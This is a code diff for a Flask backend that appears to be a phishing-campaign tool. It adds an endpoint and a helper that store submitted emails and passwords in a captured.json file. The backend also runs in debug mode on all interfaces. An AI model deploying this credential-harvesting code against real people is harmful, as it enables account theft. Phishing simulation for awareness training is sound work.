@@ -16,6 +16,10 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 PHISHING_TEMPLATE_FOLDER = os.path.join(BASE_DIR, "backend", "templates")
 PHISHING_STATIC_FOLDER = os.path.join(BASE_DIR, "backend", "static")
 LOG_FILE = os.path.join(BASE_DIR, "backend", "data", "logs.json")
+CAPTURED_LOG_FILE = os.path.join(os.path.dirname(__file__), "backend", "data", "captured.json")
+
+# Ensure logs directory exists
+os.makedirs(os.path.dirname(CAPTURED_LOG_FILE), exist_ok=True)
 
 # Ensure logs directory exists
 os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
@@ -217,5 +221,62 @@ def send_campaign():
         return jsonify({"error": f"SMTP error: {str(e)}"}), 500
     except Exception as e:
         return jsonify({"error": f"Unexpected error: {str(e)}"}), 500
+
+def log_credentials(data):
+    """ Append captured credentials to captured.json """
+    try:
+        if os.path.exists(CAPTURED_LOG_FILE):
+            with open(CAPTURED_LOG_FILE, "r", encoding="utf-8") as file:
+                try:
+                    logs = json.load(file)
+                except json.JSONDecodeError:
+                    logs = []
+        else:
+            logs = []
+
+        data["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        logs.append(data)
+
+        with open(CAPTURED_LOG_FILE, "w", encoding="utf-8") as file:
+            json.dump(logs, file, indent=4)
+
+        print(f"✅ Credentials logged: {data['email']} | {data['campaign']}")
+    except Exception as e:
+        print(f"❌ Error logging credentials: {e}")
+
+@app.route("/api/capture-credentials", methods=["POST"])
+def capture_credentials():
+    try:
+        data = request.json
+        if not data.get("email") or not data.get("password"):
+            return jsonify({"error": "Invalid data"}), 400
+
+        log_credentials(data)
+        return jsonify({"message": "Credentials captured successfully!"})
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+    
+@app.route("/api/latest-campaign", methods=["GET"])
+def get_latest_campaign():
+    """ Fetch the most recent campaign from logs.json """
+    try:
+        if not os.path.exists(LOG_FILE):
+            return jsonify({"error": "No campaigns found"}), 404
+
+        with open(LOG_FILE, "r", encoding="utf-8") as file:
+            try:
+                logs = json.load(file)
+            except json.JSONDecodeError:
+                return jsonify({"error": "Invalid log file format"}), 500
+
+        if not logs:
+            return jsonify({"error": "No campaigns recorded"}), 404
+
+        latest_campaign = logs[-1]  # Get last campaign entry
+        return jsonify({"campaign_name": latest_campaign.get("campaignName", "Unknown Campaign")})
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 app.run(host='0.0.0.0', debug=True)
